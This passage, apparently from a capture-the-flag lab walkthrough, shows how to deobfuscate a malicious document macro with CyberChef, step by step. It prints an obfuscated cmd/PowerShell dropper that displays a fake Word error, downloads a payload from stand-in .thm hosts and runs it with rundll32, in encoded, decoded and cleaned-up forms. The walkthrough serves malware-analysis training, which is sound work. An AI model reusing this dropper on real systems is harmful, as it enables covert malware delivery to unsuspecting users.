_]l[_]A[_]H[_]g[_]A[_]Z[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]A[_]A[_]F[_]0[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]Y[_]g[_]A[_]\ny[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]I[_]A[_]F[_]8[_]A[_]c[_]w[_]A[_]6[_]A[_]C[_]8[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]L[_]w[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]Z[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]v[_]A[_]G[_]8[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]Z[_]w[_]B[_]s[_]A[_]G[_]U[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]C[_]4[_]A[_]Y[_]w[_]B[_]v[_]A[_]G[_]0[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]C[_]8[_]A[_]\nJ[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]Q[_]A[_]B[_]d[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]i[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]D[_]I[_]A[_]S[_]A[_]B[_]f[_]A[_]H[_]M[_]A[_]O[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]v[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]C[_]8[_]A[_]d[_]w[_]B[_]3[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]3[_]A[_]C[_]4[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]c[_]w[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]Z[_]Q[_]B[_]j[_]A[_]\nH[_]I[_]A[_]Z[_]Q[_]B[_]0[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]F[_]M[_]A[_]Y[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]u[_]A[_]H[_]Q[_]A[_]Y[_]Q[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]L[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]U[_]A[_]E[_]g[_]A[_]T[_]Q[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]C[_]8[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]H[_]A[_]G[_]8[_]A[_]b[_]A[_]B[_]k[_]A[_]G[_]U[_]A[_]b[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]0[_]A[_]G[_]k[_]A[_]J[_]w[_]\nA[_]p[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]j[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]s[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]l[_]A[_]H[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]L[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]U[_]A[_]E[_]g[_]A[_]T[_]Q[_]B[_]f[_]A[_]E[_]0[_]A[_]W[_]Q[_]B[_]T[_]A[_]F[_]Q[_]A[_]R[_]Q[_]B[_]S[_]A[_]F[_]k[_]A[_]X[_]w[_]B[_]G[_]A[_]E[_]w[_]A[_]Q[_]Q[_]B[_]H[_]A[_]E[_]A[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]d[_]A[_]G[_]I[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]\nA[_]J[_]w[_]A[_]y[_]A[_]E[_]g[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]X[_]w[_]B[_]z[_]A[_]D[_]o[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]C[_]8[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]L[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]j[_]A[_]G[_]Q[_]A[_]b[_]g[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]L[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]i[_]A[_]G[_]E[_]A[_]b[_]g[_]B[_]k[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]G[_]k[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]0[_]\nA[_]H[_]k[_]A[_]Z[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]H[_]Q[_]A[_]a[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]u[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]c[_]A[_]V[_]A[_]B[_]I[_]A[_]E[_]0[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]A[_]v[_]A[_]G[_]Y[_]A[_]a[_]Q[_]B[_]s[_]A[_]G[_]U[_]A[_]c[_]w[_]A[_]v[_]A[_]G[_]k[_]A[_]b[_]g[_]B[_]k[_]A[_]G[_]U[_]A[_]e[_]A[_]A[_]v[_]A[_]C[_]k[_]A[_]L[_]g[_]A[_]g[_]A[_]C[_]I[_]A[_]c[_]g[_]B[_]F[_]A[_]F[_]A[_]A[_]b[_]A[_]B[_]B[_]A[_]G[_]A[_]A[_]Y[_]\nw[_]B[_]F[_]A[_]C[_]I[_]A[_]K[_]A[_]A[_]o[_]A[_]C[_]c[_]A[_]X[_]Q[_]B[_]i[_]A[_]D[_]I[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]I[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]F[_]8[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]k[_]A[_]L[_]A[_]A[_]o[_]A[_]F[_]s[_]A[_]Y[_]Q[_]B[_]y[_]A[_]H[_]I[_]A[_]Y[_]Q[_]B[_]5[_]A[_]F[_]0[_]A[_]K[_]A[_]A[_]n[_]A[_]H[_]M[_]A[_]Z[_]A[_]A[_]n[_]A[_]C[_]w[_]A[_]J[_]w[_]B[_]z[_]A[_]H[_]c[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]w[_]A[_]K[_]A[_]A[_]n[_]A[_]G[_]g[_]A[_]d[_]A[_]A[_]n[_]A[_]C[_]\ns[_]A[_]J[_]w[_]B[_]0[_]A[_]H[_]A[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]w[_]A[_]J[_]w[_]A[_]z[_]A[_]G[_]Q[_]A[_]J[_]w[_]A[_]p[_]A[_]F[_]s[_]A[_]M[_]Q[_]B[_]d[_]A[_]C[_]k[_]A[_]L[_]g[_]A[_]i[_]A[_]H[_]M[_]A[_]U[_]A[_]B[_]s[_]A[_]G[_]A[_]A[_]S[_]Q[_]B[_]0[_]A[_]C[_]I[_]A[_]K[_]A[_]A[_]k[_]A[_]F[_]Q[_]A[_]M[_]g[_]A[_]2[_]A[_]E[_]E[_]A[_]I[_]A[_]A[_]r[_]A[_]C[_]A[_]A[_]J[_]A[_]B[_]2[_]A[_]G[_]E[_]A[_]c[_]g[_]B[_]f[_]A[_]E[_]E[_]A[_]I[_]A[_]A[_]r[_]A[_]C[_]A[_]A[_]J[_]A[_]B[_]C[_]A[_]D[_]c[_]A[_]N[_]Q[_]B[_]\nQ[_]A[_]C[_]k[_]A[_]O[_]w[_]A[_]k[_]A[_]F[_]c[_]A[_]N[_]w[_]A[_]x[_]A[_]F[_]Q[_]A[_]P[_]Q[_]A[_]o[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]Q[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]D[_]k[_]A[_]M[_]w[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]w[_]A[_]n[_]A[_]F[_]g[_]A[_]J[_]w[_]A[_]p[_]A[_]D[_]s[_]A[_]Z[_]g[_]B[_]v[_]A[_]H[_]I[_]A[_]Z[_]Q[_]B[_]h[_]A[_]G[_]M[_]A[_]a[_]A[_]A[_]g[_]A[_]C[_]g[_]A[_]J[_]A[_]B[_]2[_]A[_]G[_]E[_]A[_]c[_]g[_]B[_]f[_]A[_]E[_]I[_]A[_]I[_]A[_]B[_]p[_]A[_]G[_]4[_]A[_]I[_]A[_]A[_]k[_]A[_]E[_]0[_]A[_]\nc[_]g[_]B[_]r[_]A[_]G[_]o[_]A[_]K[_]Q[_]B[_]7[_]A[_]H[_]Q[_]A[_]c[_]g[_]B[_]5[_]A[_]H[_]s[_]A[_]K[_]A[_]A[_]u[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]O[_]A[_]G[_]U[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]d[_]w[_]A[_]t[_]A[_]E[_]8[_]A[_]Y[_]g[_]B[_]q[_]A[_]G[_]U[_]A[_]Y[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]0[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]g[_]A[_]H[_]M[_]A[_]W[_]Q[_]B[_]z[_]A[_]H[_]Q[_]A[_]Z[_]Q[_]B[_]N[_]A[_]C[_]4[_]A[_]b[_]g[_]B[_]l[_]A[_]H[_]Q[_]A[_]L[_]g[_]B[_]X[_]A[_]E[_]U[_]A[_]Y[_]g[_]B[_]D[_]A[_]\nE[_]w[_]A[_]a[_]Q[_]B[_]F[_]A[_]G[_]4[_]A[_]d[_]A[_]A[_]p[_]A[_]C[_]4[_]A[_]I[_]g[_]B[_]E[_]A[_]E[_]8[_]A[_]d[_]w[_]B[_]O[_]A[_]E[_]w[_]A[_]b[_]w[_]B[_]B[_]A[_]G[_]Q[_]A[_]Z[_]g[_]B[_]g[_]A[_]E[_]k[_]A[_]Y[_]A[_]B[_]M[_]A[_]G[_]U[_]A[_]I[_]g[_]A[_]o[_]A[_]C[_]Q[_]A[_]d[_]g[_]B[_]h[_]A[_]H[_]I[_]A[_]X[_]w[_]B[_]C[_]A[_]C[_]w[_]A[_]I[_]A[_]A[_]k[_]A[_]E[_]M[_]A[_]e[_]Q[_]B[_]n[_]A[_]D[_]A[_]A[_]a[_]w[_]B[_]1[_]A[_]D[_]c[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]R[_]w[_]A[_]3[_]A[_]D[_]U[_]A[_]U[_]Q[_]\nA[_]9[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]X[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]O[_]A[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]f[_]A[_]F[_]I[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]k[_]A[_]O[_]w[_]B[_]J[_]A[_]G[_]Y[_]A[_]I[_]A[_]A[_]o[_]A[_]C[_]g[_]A[_]J[_]g[_]A[_]o[_]A[_]C[_]c[_]A[_]R[_]w[_]B[_]l[_]A[_]H[_]Q[_]A[_]L[_]Q[_]B[_]J[_]A[_]H[_]Q[_]A[_]J[_]w[_]A[_]r[_]A[_]C[_]c[_]A[_]Z[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]t[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]g[_]A[_]C[_]Q[_]A[_]Q[_]w[_]B[_]5[_]A[_]G[_]c[_]\nA[_]M[_]A[_]B[_]r[_]A[_]H[_]U[_]A[_]N[_]w[_]A[_]p[_]A[_]C[_]4[_]A[_]I[_]g[_]B[_]s[_]A[_]G[_]A[_]A[_]Z[_]Q[_]B[_]u[_]A[_]G[_]c[_]A[_]d[_]A[_]B[_]o[_]A[_]C[_]I[_]A[_]I[_]A[_]A[_]t[_]A[_]G[_]c[_]A[_]Z[_]Q[_]A[_]g[_]A[_]D[_]M[_]A[_]M[_]A[_]A[_]1[_]A[_]D[_]c[_]A[_]N[_]Q[_]A[_]p[_]A[_]C[_]A[_]A[_]e[_]w[_]A[_]u[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]y[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]H[_]U[_]A[_]b[_]g[_]B[_]k[_]A[_]G[_]w[_]A[_]b[_]A[_]A[_]z[_]A[_]D[_]I[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]A[_]A[_]J[_]A[_]B[_]D[_]\nA[_]H[_]k[_]A[_]Z[_]w[_]A[_]w[_]A[_]G[_]s[_]A[_]d[_]Q[_]A[_]3[_]A[_]C[_]w[_]A[_]K[_]A[_]A[_]n[_]A[_]E[_]M[_]A[_]b[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]G[_]4[_]A[_]d[_]A[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]y[_]A[_]G[_]8[_]A[_]b[_]A[_]B[_]f[_]A[_]F[_]I[_]A[_]d[_]Q[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]u[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]r[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]E[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]n[_]A[_]E[_]w[_]A[_]T[_]A[_]A[_]n[_]A[_]C[_]k[_]A[_]K[_]Q[_]A[_]u[_]A[_]C[_]I[_]A[_]V[_]\nA[_]B[_]g[_]A[_]G[_]8[_]A[_]c[_]w[_]B[_]U[_]A[_]H[_]I[_]A[_]Y[_]A[_]B[_]J[_]A[_]E[_]4[_]A[_]R[_]w[_]A[_]i[_]A[_]C[_]g[_]A[_]K[_]Q[_]A[_]7[_]A[_]C[_]Q[_]A[_]Q[_]g[_]A[_]y[_]A[_]D[_]k[_]A[_]R[_]A[_]A[_]9[_]A[_]C[_]g[_]A[_]J[_]w[_]B[_]a[_]A[_]C[_]c[_]A[_]K[_]w[_]A[_]o[_]A[_]C[_]c[_]A[_]N[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]y[_]A[_]F[_]c[_]A[_]J[_]w[_]A[_]p[_]A[_]C[_]k[_]A[_]O[_]w[_]B[_]i[_]A[_]H[_]I[_]A[_]Z[_]Q[_]B[_]h[_]A[_]G[_]s[_]A[_]O[_]w[_]A[_]k[_]A[_]E[_]Y[_]A[_]M[_]g[_]A[_]2[_]A[_]E[_]\nY[_]A[_]P[_]Q[_]A[_]o[_]A[_]C[_]c[_]A[_]V[_]g[_]A[_]n[_]A[_]C[_]s[_]A[_]K[_]A[_]A[_]n[_]A[_]D[_]M[_]A[_]N[_]w[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]B[_]X[_]A[_]C[_]c[_]A[_]K[_]Q[_]A[_]p[_]A[_]H[_]0[_]A[_]f[_]Q[_]B[_]j[_]A[_]G[_]E[_]A[_]d[_]A[_]B[_]j[_]A[_]G[_]g[_]A[_]e[_]w[_]B[_]9[_]A[_]H[_]0[_]A[_]J[_]A[_]B[_]K[_]A[_]D[_]E[_]A[_]X[_]w[_]B[_]O[_]A[_]D[_]0[_]A[_]K[_]A[_]A[_]n[_]A[_]F[_]Q[_]A[_]M[_]A[_]A[_]n[_]A[_]C[_]s[_]A[_]J[_]w[_]A[_]4[_]A[_]E[_]g[_]A[_]J[_]w[_]A[_]p[_]A[_]A[_]=[_]=\n</code></pre> <p>Replace the <code>[_]</code> characters using the <code>Find/Replace</code> recipe with <code>Find = [\\[\\]_\\n]</code>.</p> <pre><code>cmd cmd cmd cmd /c msg %username% /v Word experienced an error trying to open the file. &amp; P^Ow^er^she^L^L -w hidden -ENCOD  UwBFAFQALQBWAGEAcgBJAEEAQgBsAGUAIAAgADgAaQBoADUANgA3ACAAIAAoACAAIABbAHQAWQBwAGUAXQAoACIAewAzAH0AewAwAH0AewA0AH0AewAyAH0AewAxAH0AIgAtAGYAJwBZAHMAVAAnACwAJwBSAGUAYwBUAE8AUgB5ACcALAAnAE0ALgBpAE8ALgBEAEkAJwAsACcAcwAnACwAJwBlACcAKQApADsAIAAgACAAUwBFAFQALQBJAHQAZQBtACAAKAAiAHYAQQAiACsAIgBSAGkAQQAiACsAIgBiAEwAZQA6AFIAIgArACIAaQAiACsAIgA3AHgATwAzACIAKQAgACgAWwBUAHkAUABlAF0AKAAiAHsAMgB9AHsANQB9AHsANAB9AHsAMwB9AHsAMQB9AHsAMAB9ACIALQBGACAAJwBSACcALAAnAE0AYQBOAGEARwBFACcALAAnAFMAJwAsACcAVgBJAGMARQBQAG8ASQBuAHQAJwAsACcALgBuAGUAVAAuAHMARQByACcALAAnAFkAcwB0AGUAbQAnACkAIAApACAAIAA7ACAAIAAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACgAJwBTAGkAJwArACgAJwBsAGUAbgAnACsAJwB0ACcAKQArACgAJwBsACcAKwAnAHkAQwBvAG4AdAAnACkAKwAnAGkAJwArACgAJwBuACcAKwAnAHUAZQAnACkAKQA7ACQAdgBhAHIAXwBBAD0AJABQADUAOABCACAAKwAgAFsAYwBoAGEAcgBdACgANgA0ACkAIAArACAAJABaADEAOQBSADsAJABCADUAMwBOAD0AKAAoACcAUwAnACsAJwA3ADcAJwApACsAJwBIACcAKQA7ACAAIAAoACAAIABsAHMAIAAgAFYAYQByAEkAYQBCAEwARQA6ADgAaQBoADUANgA3ACAAIAApAC4AVgBhAGwAdQBlADoAOgAiAEMAUgBFAEEAdABgAEUAYABEAGAAaQBSAGUAYwBUAE8AcgBZACIAKAAkAEgATwBNAEUAIAArACAAKAAoACgAJwBlAE4ANwBSAHIAJwArACcAMQBzACcAKwAnAGoAOQBhACcAKwAnAGUATgAnACkAKwAnADcAJwArACgAJwBCACcAKwAnAGMAeAAnACkAKwAoACcANABpACcAKwAnAGEAeQBlACcAKQArACcATgA3ACcAKQAuACIAcgBlAFAAYABMAGEAYABjAEUAIgAoACgAWwBDAEgAYQBSAF0AMQAwADEAKwBbAEMASABhAFIAXQA3ADgAKwBbAEMASABhAFIAXQA1ADUAKQAsAEgAXwBUAHIAaQBuAEcAXQBbAEMASABhAFIAXQA5ADIAKQApACkAOwAkAFYANQA3AFIAPQAoACgAJwBCACcAKwAnADQANgAnACkAKwAnAFYAJwApADsAIAAoAHYAYQBSAEkAYQBCAGwAZQAgACgAIgBSACIAKwAiAGkAIgArACIANwB4AE8AMwAiACkAIAApAC4AVgBBAGwAVQBFADoAOgAiAFMAZQBDAHUAcgBJAGAAVABgAHkAUABgAFIATwBgAFQAbwBDAE8ATAAiACAAPQAgACgAKAAnAFQAJwArACcAbABzACcAKQArACcAMQAyACcAKQA7ACQAWAA0ADQAUwA9ACgAJwBTADgAJwArACcAMQBEACcAKQA7ACQAUABhADIAbgB1AHIANAAgAD0AIAAoACcASwAnACsAKAAnAF8AOQAnACsAJwBPACcAKQApADsAJABPADYANgBHAD0AKAAoACcARgA4ACcAKwAnADgAJwApACsAJwBXACcAKQA7ACQAQwB5AGcAMABrAHUANwA9ACQASABPAE0ARQArACgAKAAoACcAZQBBAHcAUgAnACsAJwByACcAKQArACgAJwAxACcAKwAnAHMAagA5AGEAZQBBACcAKQArACgAJwB3ACcAKwAnAEIAYwB4ACcAKQArACgAJwA0AGkAYQAnACsAJwB5ACcAKwAnAGUAQQAnACkAKwAnAHcAJwApACAALQByAGUAcABMAEEAQwBlACgAJwBlAEEAJwArACcAdwAnACkALABbAGMAaABhAFIAXQA5ADIAKQArACQAUABhADIAbgB1AHIANAArACgAJwAuAGQAJwArACcAbABsACcAKQA7ACQARQAwADEAQgA9ACgAJwBSADcAJwArACcAXwBTACcAKQA7ACQATQByAGsAagBjAGkAbQA9ACgAKAAnAF0AYgAnACsAJwAyACcAKQArACcASABfACcAKwAoACcAcwA6AC8ALwAnACsAJwBjAGQAbgAuACcAKQArACcAYgBhAG4AZAAnACsAJwBpACcAKwAnAHQAJwArACcAeQAnACsAKAAnAGUAJwArACcAdABpAC4AJwApACsAKAAnAHQAaABtAC8AJwArACcAZgBpAGwAZQBzACcAKQArACgAJwAvACcAKwAnAG0AeQAnACsAJwBzAHQAZQByAHkAJwApACsAKAAnAGcAaQBmAHQAJwArACcALgBlAHgAZQAnACsAJwBAAF0AJwArACcAYgAyACcAKQArACgAJwBIAF8AcwA6AC8AJwArACcALwAnACkAKwAoACcAZwAnACsAJwBvAG8AJwArACcAZwBsAGUAJwApACsAKAAnAC4AYwBvAG0AJwApACsAKAAnAC8AJwArACcAQABdACcAKQArACgAJwBiACcAKwAnADIASABfAHMAOgAnACsAJwAvACcAKwAnAC8AdwB3ACcAKQArACgAJwB3AC4AJwArACcAcwAnACkAKwAoACcAZQBjAHIAZQB0ACcAKwAnAFMAYQAnACsAJwBuAHQAYQAnACkAKwAoACcALgAnACsAJwBUAEgATQAnACkAKwAnAC8AJwArACgAJwBHAG8AbABkAGUAbgAnACsAJwB0AGkAJwApACsAJwBjACcAKwAnAGsAJwArACgAJwBlAHQAJwArACcALwAnACsAJwBUAEgATQBfAE0AWQBTAFQARQBSAFkAXwBGAEwAQQBHAEAAJwApACsAJwBdAGIAJwArACgAJwAyAEgAJwArACcAXwBzADoAJwApACsAKAAnAC8AJwArACcALwAnACsAJwBjAGQAbgAnACkAKwAoACcALgAnACsAJwBiAGEAbgBkACcAKwAnAGkAJwApACsAJwB0AHkAZQAnACsAKAAnAHQAaQAnACsAJwAuACcAKQArACcAVABIAE0AJwArACgAJwAvAGYAaQBsAGUAcwAvAGkAbgBkAGUAeAAvACkALgAgACIAcgBFAFAAbABBAGAAYwBFACIAKAAoACcAXQBiADIAJwArACgAJwBIACcAKwAnAF8AJwApACkALAAoAFsAYQByAHIAYQB5AF0AKAAnAHMAZAAnACwAJwBzAHcAJwApACwAKAAnAGgAdAAnACsAJwB0AHAAJwApACwAJwAzAGQAJwApAFsAMQBdACkALgAiAHMAUABsAGAASQB0ACIAKAAkAFQAMgA2AEEAIAArACAAJAB2AGEAcgBfAEEAIAArACAAJABCADcANQBQACkAOwAkAFcANwAxAFQAPQAoACgAJwBQACcAKwAnADkAMwAnACkAKwAnAFgAJwApADsAZgBvAHIAZQBhAGMAaAAgACgAJAB2AGEAcgBfAEIAIABpAG4AIAAkAE0AcgBrAGoAKQB7AHQAcgB5AHsAKAAuACgAJwBOAGUAJwArACcAdwAtAE8AYgBqAGUAYwAnACsAJwB0ACcAKQAgAHMAWQBzAHQAZQBNAC4AbgBlAHQALgBXAEUAYgBDAEwAaQBFAG4AdAApAC4AIgBEAE8AdwBOAEwAbwBBAGQAZgBgAEkAYABMAGUAIgAoACQAdgBhAHIAXwBCACwAIAAkAEMAeQBnADAAawB1ADcAKQA7ACQARwA3ADUAUQA9ACgAJwBXACcAKwAoACcAOAAnACsAJwBfAFIAJwApACkAOwBJAGYAIAAoACgAJgAoACcARwBlAHQALQBJAHQAJwArACcAZQAnACsAJwBtACcAKQAgACQAQwB5AGcAMABrAHUANwApAC4AIgBsAGAAZQBuAGcAdABoACIAIAAtAGcAZQAgADMAMAA1ADcANQApACAAewAuACgAJwByACcAKwAnAHUAbgBkAGwAbAAzADIAJwApACAAJABDAHkAZwAwAGsAdQA3ACwAKAAnAEMAbwAnACsAKAAnAG4AdAAnACsAJwByAG8AbABfAFIAdQAnACsAJwBuACcAKQArACgAJwBEACcAKwAnAEwATAAnACkAKQAuACIAVABgAG8AcwBUAHIAYABJAE4ARwAiACgAKQA7ACQAQgAyADkARAA9ACgAJwBaACcAKwAoACcANgAnACsAJwAyAFcAJwApACkAOwBiAHIAZQBhAGsAOwAkAEYAMgA2AEYAPQAoACcAVgAnACsAKAAnADMANwAnACsAJwBXACcAKQApAH0AfQBjAGEAdABjAGgAewB9AH0AJABKADEAXwBOAD0AKAAnAFQAMAAnACsAJwA4AEgAJwApAA==\n</code></pre> <p>Drop the first 124 using the <code>Drop byte</code> recipe to isolate the Base64 portion of the script and use <code>From Base64</code> recipe to decode it.</p> <p>Use <code>Decode text</code> and set <code>Encoding = UTF-16LE (1200)</code>. Powershell scripts in general use UTF-16LE (1200) encoding by default.</p> <pre><code>SET-VarIABle  8ih567  (  [tYpe](\"{3}{0}{4}{2}{1}\"-f'YsT','RecTORy','M.iO.DI','s','e'));   SET-Item (\"vA\"+\"RiA\"+\"bLe:R\"+\"i\"+\"7xO3\") ([TyPe](\"{2}{5}{4}{3}{1}{0}\"-F 'R','MaNaGE','S','VIcEPoInt','.neT.sEr','Ystem') )  ;  $ErrorActionPreference = ('Si'+('len'+'t')+('l'+'yCont')+'i'+('n'+'ue'));$var_A=$P58B + [char](64) + $Z19R;$B53N=(('S'+'77')+'H');  (  ls  VarIaBLE:8ih567  ).Value::\"CREAt`E`D`iRecTOrY\"($HOME + ((('eN7Rr'+'1s'+'j9a'+'eN')+'7'+('B'+'cx')+('4i'+'aye')+'N7').\"reP`La`cE\"(([CHaR]101+[CHaR]78+[CHaR]55),H_TrinG][CHaR]92)));$V57R=(('B'+'46')+'V'); (vaRIaBle (\"R\"+\"i\"+\"7xO3\") ).VAlUE::\"SeCurI`T`yP`RO`ToCOL\" = (('T'+'ls')+'12');$X44S=('S8'+'1D');$Pa2nur4 = ('K'+('_9'+'O'));$O66G=(('F8'+'8')+'W');$Cyg0ku7=$HOME+((('eAwR'+'r')+('1'+'sj9aeA')+('w'+'Bcx')+('4ia'+'y'+'eA')+'w') -repLACe('eA'+'w'),[chaR]92)+$Pa2nur4+('.d'+'ll');$E01B=('R7'+'_S');$Mrkjcim=((']b'+'2')+'H_'+('s://'+'cdn.')+'band'+'i'+'t'+'y'+('e'+'ti.')+('thm/'+'files')+('/'+'my'+'stery')+('gift'+'.exe'+'@]'+'b2')+('H_s:/'+'/')+('g'+'oo'+'gle')+('.com')+('/'+'@]')+('b'+'2H_s:'+'/'+'/ww')+('w.'+'s')+('ecret'+'Sa'+'nta')+('.'+'THM')+'/'+('Golden'+'ti')+'c'+'k'+('et'+'/'+'THM_MYSTERY_FLAG@')+']b'+('2H'+'_s:')+('/'+'/'+'cdn')+('.'+'band'+'i')+'tye'+('ti'+'.')+'THM'+('/files/index/). \"rEPlA`cE\"((']b2'+('H'+'_')),([array]('sd','sw'),('ht'+'tp'),'3d')[1]).\"sPl`It\"($T26A + $var_A + $B75P);$W71T=(('P'+'93')+'X');foreach ($var_B in $Mrkj){try{(.('Ne'+'w-Objec'+'t') sYsteM.net.WEbCLiEnt).\"DOwNLoAdf`I`Le\"($var_B, $Cyg0ku7);$G75Q=('W'+('8'+'_R'));If ((&amp;('Get-It'+'e'+'m') $Cyg0ku7).\"l`ength\" -ge 30575) {.('r'+'undll32') $Cyg0ku7,('Co'+('nt'+'rol_Ru'+'n')+('D'+'LL')).\"T`osTr`ING\"();$B29D=('Z'+('6'+'2W'));break;$F26F=('V'+('37'+'W'))}}catch{}}$J1_N=('T0'+'8H')\n</code></pre> <p>Use the <code>Find/Replace</code> recipe to remove [ ' () + ' \" ` ] characters.</p> <pre><code>SET-VarIABle  8ih567    [tYpe]{3}{0}{4}{2}{1}-fYsT,RecTORy,M.iO.DI,s,e;   SET-Item vARiAbLe:Ri7xO3 [TyPe]{2}{5}{4}{3}{1}{0}-F R,MaNaGE,S,VIcEPoInt,.neT.sEr,Ystem   ;  $ErrorActionPreference = SilentlyContinue;$var_A=$P58B  [char]64  $Z19R;$B53N=S77H;    ls  VarIaBLE:8ih567  .Value::CREAtEDiRecTOrY$HOME  eN7Rr1sj9aeN7Bcx4iayeN7.rePLacE[CHaR]101[CHaR]78[CHaR]55,H_TrinG][CHaR]92;$V57R=B46V; vaRIaBle Ri7xO3 .VAlUE::SeCurITyPROToCOL = Tls12;$X44S=S81D;$Pa2nur4 = K_9O;$O66G=F88W;$Cyg0ku7=$HOMEeAwRr1sj9aeAwBcx4iayeAw -repLACeeAw,[chaR]92$Pa2nur4.dll;$E01B=R7_S;$Mrkjcim=]b2H_s://cdn.bandityeti.thm/files/mysterygift.exe@]b2H_s://google.com/@]b2H_s://www.secretSanta.THM/Goldenticket/THM_MYSTERY_FLAG@]b2H_s://cdn.bandityeti.THM/files/index/. rEPlAcE]b2H_,[array]sd,sw,http,3d[1].sPlIt$T26A  $var_A  $B75P;$W71T=P93X;foreach $var_B in $Mrkj{try{.New-Object sYsteM.net.WEbCLiEnt.DOwNLoAdfILe$var_B, $Cyg0ku7;$G75Q=W8_R;If &amp;Get-Item $Cyg0ku7.length -ge 30575 {.rundll32 $Cyg0ku7,Control_RunDLL.TosTrING;$B29D=Z62W;break;$F26F=V37W}}catch{}}$J1_N=T08H\n</code></pre> <p>Use the <code>Find/Replace</code> recipe to replace <code>]b2H_</code> with <code>http</code>.</p> 